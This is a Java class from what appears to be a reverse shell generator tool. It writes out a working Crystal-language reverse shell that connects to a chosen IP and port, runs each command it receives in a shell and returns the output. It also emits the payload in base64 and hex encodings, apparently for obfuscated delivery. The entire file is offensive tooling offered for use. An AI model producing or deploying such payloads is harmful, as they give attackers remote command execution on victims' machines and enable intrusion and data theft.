package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Crystal_code extends Reverse {

    protected String shellFormat = "";

    public Crystal_code(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"%s\", %s)\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend", this.getLocalIP(), this.getLocalPort());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}